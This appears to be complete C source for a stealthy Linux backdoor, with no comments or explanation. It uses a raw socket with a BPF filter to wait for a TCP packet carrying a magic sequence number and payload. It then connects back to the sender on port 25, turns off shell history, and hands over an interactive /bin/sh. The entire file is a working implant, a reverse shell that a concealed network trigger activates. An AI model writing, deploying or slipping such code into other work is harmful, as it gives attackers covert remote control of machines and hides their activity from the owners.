#include <arpa/inet.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
extern char **environ;
int main(void) {
    struct sock_filter insns[] = {
        BPF_STMT(BPF_LD | BPF_H | BPF_ABS, 12),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0x0800, 0, 13),
        BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 23),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 6, 0, 11),
        BPF_STMT(BPF_LD | BPF_H | BPF_ABS, 20),
        BPF_JUMP(BPF_JMP | BPF_JSET | BPF_K, 0x1fff, 9, 0),
        BPF_STMT(BPF_LDX | BPF_B | BPF_MSH, 14),
        BPF_STMT(BPF_LD | BPF_B | BPF_IND, 26),
        BPF_STMT(BPF_ALU | BPF_AND | BPF_K, 0xf0),
        BPF_STMT(BPF_ALU | BPF_RSH | BPF_K, 2),
        BPF_STMT(BPF_ALU | BPF_ADD | BPF_X, 0),
        BPF_STMT(BPF_MISC | BPF_TAX, 0),
        BPF_STMT(BPF_LD | BPF_W | BPF_IND, 14),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0x6d54f082, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, 0xffffffff),
        BPF_STMT(BPF_RET | BPF_K, 0)
    };
    struct sock_fprog filter = {16, insns};
    int tap = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    setsockopt(tap, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter));
    unsigned char packet[2048];
    struct sockaddr_in peer;
    socklen_t len = sizeof(peer);
    if (recvfrom(tap, packet, sizeof(packet), 0, (struct sockaddr *)&peer, &len) <= 0) return 1;
    if (memcmp(packet + 54, "\x01\x12\x23\x34\x45\x56\x67\x78\x89\x9a\xab\xbc\xcd\xde", 14)) return 1;
    memcpy(&peer.sin_addr, packet + 26, 4);
    peer.sin_family = AF_INET;
    peer.sin_port = htons(25);
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(fd, (struct sockaddr *)&peer, sizeof(peer))) return 1;
    setenv("HISTFILE", "/dev/null", 1);
    dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
    char *argv[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", argv, environ);
}
